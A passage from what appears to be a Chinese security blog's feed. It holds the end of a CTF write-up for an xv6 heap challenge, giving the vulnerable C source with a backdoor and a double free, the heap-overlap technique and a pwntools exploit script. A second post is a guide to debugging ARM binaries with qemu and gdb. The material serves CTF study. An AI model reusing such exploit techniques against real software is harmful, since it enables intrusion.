class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">read(<span class="number">1</span>, &amp;buf[i], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(buf[i] == <span class="string">&#x27;\x0a&#x27;</span>)&#123;</span><br><span class="line">buf[i] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (size &lt; <span class="number">0</span> || size &gt; <span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">4</span>; idx++)</span><br><span class="line"><span class="keyword">if</span> (arr[idx] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (idx == <span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arr[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">readline(arr[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[idx]) &#123;</span><br><span class="line"><span class="built_in">free</span>(arr[idx]);</span><br><span class="line"><span class="keyword">if</span> (chance)</span><br><span class="line">record = arr[idx];</span><br><span class="line">arr[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> *argv[] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (chance) &#123;</span><br><span class="line"><span class="keyword">if</span> (record)</span><br><span class="line"><span class="built_in">free</span>(record);</span><br><span class="line">record = <span class="number">0</span>;</span><br><span class="line">chance = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">banner();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">switch</span> (choice) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">delete();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">gift();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目给出的<code>backdoor</code>，而且<code>gitf</code>函数则是直接送了一次<code>double free</code><br>但是我们不能直接<code>double free</code>，主要有两个原因：</p><ul><li>观察到<code>free</code>函数前面会有一个循环遍历</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">  <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>如果直接<code>double free</code>会直接在这里进入死循环</p><ul><li><code>ptr</code>指针在<code>heap</code>的头部前<code>8</code>个字节，直接<code>double free</code>并不能对起做任何修改</li></ul><p>所以可以选择叠堆后造成堆溢出才有机会修改<code>ptr</code>指针</p><p>因为这里的堆块合并条件非常简单，所以造堆叠也很简单，先<code>free</code>两个相邻的堆块让他们合并（下文称这两个堆块中低地址的堆块为<code>a</code>，高地址的为<code>b</code>），合并后表头<code>freep</code>变为刚刚释放的<code>a</code>，然后<code>double free</code>堆块<code>b</code>，这个时候因为表头是<code>a</code>，所以第一次循环就满足 <code>if(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</code> 的条件退出循环，这时又因为<code>b</code>与之前<code>a</code>不相邻（合并后堆块<code>a</code>的<code>size</code>已被修改为合并后的大小），所以不会触发合并，而是将<code>b</code>直接链入链表。现在只需要将<code>a</code>申请出来，就可以堆叠到<code>b</code>进行非法写入修改<code>free</code>链表上堆块<code>b</code>的<code>s.ptr</code>。因为之前合并的时候<code>freep</code>被赋值为了堆块<code>a</code>，而<code>malloc</code>遍历是从<code>freep-&gt;s.ptr</code>开始遍历的，为了简化利用模型，可以再<code>free</code>一个低于以上两个且不相邻的堆块来更新<code>freep</code>，将<code>freep-&gt;s.ptr</code>变成堆块<code>a</code>，然后下次<code>malloc</code>的时候就会从<code>a</code>开始遍历。这时申请出<code>size</code>为<code>a+b</code>堆块就可以把之前的<code>a</code>申请出来，利用堆叠写<code>b-&gt;s.ptr</code>为目标地址<code>addr</code>，再连续分配两次（先要把<code>b</code>给申请出来），<code>malloc</code>就会尝试将<code>addr</code>分配出去，这时如果<code>addr</code>合法（地址合法且<code>size</code>符合要求）就会返回<code>addr</code>，到这一步就完成了容易地址分配<br>至于分配到哪，因为程序是静态链接的，没<code>got</code>表可打，没动态库中的<code>hook</code>和<code>glibc</code>中的经典<code>io</code>可打，也没什么现成的函数指针可以利用。所以考虑分配到栈上劫持返回地址到后门，因为系统没有<code>ASLR</code>功能（其实出题人出到一半看到了一篇<code>xv6</code>实现<code>ASLR</code>功能的论文，但因为时间比较仓促所以没有把<code>ASLR</code>加上了，也算是变相降低了难度吧），可以通过调试找到固定的栈帧地址来劫持<code>add</code>函数的返回地址。最后就是因为<code>malloc</code>函数中要<code>size</code>满足要求才能将目标地址<code>addr</code>分配出去，所以这里可以考虑利用<code>add</code>函数的局部栈上变量<code>size</code>和<code>idx</code>来构造合法的<code>size</code>将<code>addr</code>分配出去，这里用的是<code>idx</code>（<code>idx</code>最后为<code>3</code>，可以通过 <code>malloc(0x20)</code> 分配）</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. ???\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gift()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x3fa4</span>))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p64(<span class="number">0x2da</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;附件：&lt;a href=&quot;https://github.com/Qanux/uheap&quot;&gt;https://github.com/Qanux/uheap&lt;/a&gt;&lt;br&gt;这是一道&lt;code&gt;133nson&lt;/code&gt;师兄出的题(太强啦),看了后只能说自己的见识还是太少了。&lt;br</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>记一次使用gdb来调试异构程序</title>
    <link href="https://qanux.github.io/2023/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BD%BF%E7%94%A8gdb%E6%9D%A5%E8%B0%83%E8%AF%95%E5%BC%82%E6%9E%84%E7%A8%8B%E5%BA%8F/"/>
    <id>https://qanux.github.io/2023/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BD%BF%E7%94%A8gdb%E6%9D%A5%E8%B0%83%E8%AF%95%E5%BC%82%E6%9E%84%E7%A8%8B%E5%BA%8F/</id>
    <published>2023-11-15T16:00:00.000Z</published>
    <updated>2024-03-14T16:53:06.110Z</updated>
    
    <content type="html"><![CDATA[<p>由于我的电脑是<code>x86</code>框架，所以无法直接启动<code>arm</code>程序，所以选择用<code>qemu</code></p><h3 id="安装qemu相关配置"><a href="#安装qemu相关配置" class="headerlink" title="安装qemu相关配置"></a>安装qemu相关配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search qemu</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo apt-get install qemu-user-static<span class="comment"># 静态链接的 qemu-user</span></span></span><br><span class="line">sudo apt-get install qemu-user-binfmt# 此命令有用，会在 /usr/bin 目录下生成 qemu-*</span><br><span class="line">sudo apt-get install qemu-system# 此命令有用，会在 /usr/bin 目录下生成 qemu-system-*</span><br></pre></td></tr></table></figure><h3 id="启动gdb进行调试"><a href="#启动gdb进行调试" class="headerlink" title="启动gdb进行调试"></a>启动gdb进行调试</h3><p>首先我们在一个终端中输入下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/pwnme$ qemu-arm -L ./ -g 8888 ./pwn</span><br></pre></td></tr></table></figure><p>其中<code>8888</code>是端口号，可以自己定义<br>第一个<code>./</code>是<code>arm</code>的相关配置文件夹<code>lib</code>在当前路径下<br>pwn为我们要调试的二进制文件<br>然后再重新打开另外一个窗口，进入到我们需要调试的文件的目录下，进行下面的操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/pwnme$ gdb-multiarch</span><br><span class="line">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line">pwndbg: loaded 149 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida GDB functions (can be used with print/break)</span><br><span class="line">------- tip of the day (disable with set show-tips off) -------</span><br><span class="line">Use GDB&#x27;s pi command to run an interactive Python console where you can use Pwndbg APIs like pwndbg.gdblib.memory.read(addr, len), pwndbg.gdblib.memory.write(addr, data), pwndbg.gdb.vmmap.get() and so on!</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">file pwn</span></span><br><span class="line">Reading symbols from pwn...</span><br><span class="line">(No debugging symbols found in pwn)</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture arm    <span class="comment"># 指定框架</span></span></span><br><span class="line">The target architecture is set to &quot;arm&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:8888  <span class="comment"># 进行连接</span></span></span><br><span class="line">Remote debugging using localhost:8888</span><br><span class="line">warning: remote target does not support file transfer, attempting to access files from local filesystem.</span><br><span class="line">Reading symbols from /mnt/d/desktop/pwnme/lib/ld-uClibc.so.0...</span><br><span class="line">(No debugging symbols found in /mnt/d/desktop/pwnme/lib/ld-uClibc.so.0)</span><br></pre></td></tr></table></figure><p>然后我们就可以愉快的进行调试了</p><h3 id="安装lib库"><a href="#安装lib库" class="headerlink" title="安装lib库"></a>安装lib库</h3><p>突然想起有的题目不会给出<code>lib</code>文件，所以这里讲讲怎么下载(以<code>arm64</code>为例)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br><span class="line">sudo apt install libc6-arm64-cross</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装好的库/usr/aarch64-linux-gnu/lib/目录下</span></span><br></pre></td></tr></table></figure><p>此时<code>lib</code>已经自动安装至<code>/usr/aarch64-linux-gnu/</code>目录下，调试时可以通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/aarch64-linux-gnu/ -g 8888 ./pwn</span><br></pre></td></tr></table></figure><p>来指定<code>lib</code>的路径</p><h3 id="使用process连接elf文件"><a href="#使用process连接elf文件" class="headerlink" title="使用process连接elf文件"></a>使用process连接elf文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;qemu-arm -L ./ ./pwn&#x27;</span>, shell = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="利用pwntools直接连接gdb"><a href="#利用pwntools直接连接gdb" class="headerlink" title="利用pwntools直接连接gdb"></a>利用pwntools直接连接gdb</h3><p>首先<code>process</code>中的参数要做修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])  <span class="comment"># 各个参数的含义和上面直接在shell中运行一样</span></span><br></pre></td></tr></table></figure><p>这时运行脚本(脚本中不需要调用<code>gdb</code>)，可以看到下面的场景</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop$ python3 exp.py  </span><br><span class="line">[+] Starting local process &#x27;/usr/bin/qemu-arm&#x27;: pid 4958</span><br><span class="line">[*] &#x27;/mnt/d/desktop/pwn&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">[DEBUG] Wrote gdb script to &#x27;/tmp/pwn_18guhmr.gdb&#x27;</span><br><span class="line">    set endian little</span><br><span class="line">    set architecture arm</span><br><span class="line">[*] running in new terminal: [&#x27;/usr/bin/gdb-multiarch&#x27;, &#x27;-q&#x27;, &#x27;4958&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwn_18guhmr.gdb&#x27;]</span><br><span class="line">[DEBUG] Created script for new terminal:</span><br><span class="line">    #!/usr/bin/python3</span><br><span class="line">    import os</span><br><span class="line">    os.execve(&#x27;/usr/bin/gdb-multiarch&#x27;, [&#x27;/usr/bin/gdb-multiarch&#x27;, &#x27;-q&#x27;, &#x27;4958&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwn_18guhmr.gdb&#x27;], os.environ)</span><br><span class="line">[DEBUG] Launching a new terminal: [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;, &#x27;/tmp/tmpw26wjqb0&#x27;]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>此时打开另外一个终端，进行下面的操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop$ gdb-multiarch -nx ./pwn # 注意要加nx，如果你安装了pwndbg然后不加直接运行的话可能在步进的时候会出错。</span><br><span class="line">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./pwn...</span><br><span class="line">(No debugging symbols found in ./pwn)</span><br><span class="line">(gdb) source ./pwndbg/gdbinit.py  # 将pwntools加载进来</span><br><span class="line">pwndbg: loaded 149 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida GDB functions (can be used with print/break)</span><br><span class="line">------- tip of the day (disable with set show-tips off) -------</span><br><span class="line">GDB&#x27;s apropos &lt;topic&gt; command displays all registered commands that are related to the given &lt;topic&gt;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> endian little  <span class="comment"># 设置小端序</span></span></span><br><span class="line">The target is set to little endian.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> sysroot ./  <span class="comment"># bin的路径</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:1234  <span class="comment"># 远程连接</span></span></span><br><span class="line">Remote debugging using localhost:1234</span><br><span class="line">Reading symbols from ./lib/ld-uClibc.so.0...</span><br><span class="line">(No debugging symbols found in ./lib/ld-uClibc.so.0)</span><br><span class="line">0x3ffe91b8 in ?? () from ./lib/ld-uClibc.so.0</span><br><span class="line">Unknown register type: None</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────</span><br><span class="line"> R0   0x0</span><br><span class="line"> R1   0x40800487 ◂— &#x27;./pwn&#x27;</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line"> R4   0x0</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x20f20 —▸ 0x1055c ◂— ldr r3, [pc, #0x1c]</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x0</span><br><span class="line"> SP   0x40800370 ◂— 0x1</span><br><span class="line"> PC   0x3ffe91b8 ◂— mov r0, sp /* &#x27;\r&#x27; */</span><br><span class="line">───────────────────────────────────────────────────────────────────[ DISASM / arm / set emulate on ]───────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x3ffe91b8    mov    r0, sp</span><br><span class="line">   0x3ffe91bc    bl     #0x3ffedf3c                   &lt;0x3ffedf3c&gt;</span><br><span class="line"></span><br><span class="line">   0x3ffe91c0    mov    r6, r0</span><br><span class="line">   0x3ffe91c4    ldr    sl, [pc, #0x30]</span><br><span class="line">   0x3ffe91c8    add    sl, pc, sl</span><br><span class="line">   0x3ffe91cc    ldr    r4, [pc, #0x2c]</span><br><span class="line">   0x3ffe91d0    ldr    r4, [sl, r4]</span><br><span class="line">   0x3ffe91d4    ldr    r1, [sp]</span><br><span class="line">   0x3ffe91d8    sub    r1, r1, r4</span><br><span class="line">   0x3ffe91dc    add    sp, sp, r4, lsl #2</span><br><span class="line">   0x3ffe91e0    add    r2, sp, #4</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp 0x40800370 ◂— 0x1</span><br><span class="line">01:0004│    0x40800374 —▸ 0x40800487 ◂— &#x27;./pwn&#x27;</span><br><span class="line">02:0008│    0x40800378 ◂— 0x0</span><br><span class="line">03:000c│    0x4080037c —▸ 0x4080048d ◂— &#x27;_=/usr/bin/python3&#x27;</span><br><span class="line">04:0010│    0x40800380 —▸ 0x408004a0 ◂— &#x27;OLDPWD=/mnt/d/desktop/mips/bins&#x27;</span><br><span class="line">05:0014│    0x40800384 —▸ 0x408004c0 ◂— &#x27;HOSTTYPE=x86_64&#x27;</span><br><span class="line">06:0018│    0x40800388 —▸ 0x408004d0 ◂— 0x48544150 (&#x27;PATH&#x27;)</span><br><span class="line">07:001c│    0x4080038c —▸ 0x408008b6 ◂— &#x27;XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop&#x27;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0 0x3ffe91b8</span><br><span class="line">   1      0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>此时即可进行调试<br>参考连接：<br><a href="https://binlep.github.io/old_blog_01/2020/03/20/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%9E%B6%E6%9E%84%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%B0%83%E8%AF%95/">https://binlep.github.io/old_blog_01&#x2F;2020&#x2F;03&#x2F;20&#x2F;【Pwn 笔记】跨平台架构的环境配置与调试&#x2F;</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;由于我的电脑是&lt;code&gt;x86&lt;/code&gt;框架，所以无法直接启动&lt;code&gt;arm&lt;/code&gt;程序，所以选择用&lt;code&gt;qemu&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;安装qemu相关配置&quot;&gt;&lt;a href=&quot;#安装qemu相关配置&quot; class=&quot;headerli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>高版本glibc堆利用笔记</title>
    <link href="https://qanux.github.io/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
